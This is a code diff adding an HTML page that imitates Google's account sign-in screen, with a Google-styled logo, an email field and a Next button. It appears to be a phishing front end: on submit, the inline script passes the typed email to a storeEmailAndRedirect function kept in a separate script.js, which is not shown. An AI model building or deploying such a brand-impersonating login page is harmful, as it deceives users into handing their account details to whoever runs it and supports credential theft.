@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        .google-blue {
+            color: #4285F4;
+        }
+        .google-red {
+            color: #DB4437;
+        }
+        .google-yellow {
+            color: #F4B400;
+        }
+        .google-green {
+            color: #0F9D58;
+        }
+        .input-focus:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.3);
+            border-color: #4285F4;
+        }
+    </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+    <!-- Header -->
+    <header class="flex justify-end p-4">
+        <nav class="flex items-center space-x-4 text-sm">
+            <a href="#" class="text-gray-600 hover:underline">Gmail</a>
+            <a href="#" class="text-gray-600 hover:underline">Images</a>
+            <button class="p-2 rounded-full hover:bg-gray-100" title="Google apps">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+                </svg>
+            </button>
+            <button class="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400">
+                Sign in
+            </button>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex flex-col items-center justify-center px-4 sm:px-0 -mt-16">
+        <div class="max-w-md w-full space-y-8">
+            <!-- Google Logo -->
+            <div class="flex justify-center">
+                <div class="flex items-center">
+                    <span class="text-4xl font-bold google-blue">G</span>
+                    <span class="text-4xl font-bold google-red">o</span>
+                    <span class="text-4xl font-bold google-yellow">o</span>
+                    <span class="text-4xl font-bold google-blue">g</span>
+                    <span class="text-4xl font-bold google-green">l</span>
+                    <span class="text-4xl font-bold google-red">e</span>
+                </div>
+            </div>
+
+            <!-- Sign In Form -->
+            <div class="bg-white rounded-lg border border-gray-200 p-8 shadow-sm">
+                <h1 class="text-2xl font-normal text-center text-gray-800 mb-6">Sign in</h1>
+                <p class="text-sm text-center text-gray-600 mb-8">Use your Google Account</p>
+
+                <form class="space-y-6">
+                    <div>
+                        <input type="email" id="email" class="input-focus w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:border-blue-500" placeholder="Email or phone">
+                        <a href="#" class="text-sm text-blue-600 hover:underline mt-1 block">Forgot email?</a>
+                    </div>
+
+                    <div class="text-sm text-gray-600">
+                        <p>Not your computer? Use Guest mode to sign in privately.</p>
+                        <a href="#" class="text-blue-600 hover:underline">Learn more</a>
+                    </div>
+
+                    <div class="flex justify-between items-center">
+                        <a href="#" class="text-blue-600 hover:underline text-sm font-medium">Create account</a>
+                        <button type="button" id="nextButton" class="bg-blue-500 text-white px-6 py-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 disabled:bg-blue-300 disabled:cursor-not-allowed" disabled>
+                            Next
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Footer Links -->
+            <div class="flex flex-wrap justify-center gap-x-6 gap-y-2 text-sm text-gray-600">
+                <label for="language-select" class="sr-only">Select language</label>
+                <select id="language-select" class="bg-transparent border-0 focus:outline-none text-gray-600" aria-label="Select language">
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                </select>
+                <a href="#" class="hover:underline">Help</a>
+                <a href="#" class="hover:underline">Privacy</a>
+                <a href="#" class="hover:underline">Terms</a>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const nextButton = document.getElementById('nextButton');
+
+            emailInput.addEventListener('input', function() {
+                nextButton.disabled = emailInput.value.trim() === '';
+            });
+
+            nextButton.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                if (email) {
+                    storeEmailAndRedirect(email);
+                }
+            });
+        });
+    </script>
+</body>
+<script src="script.js"></script>
+</html>
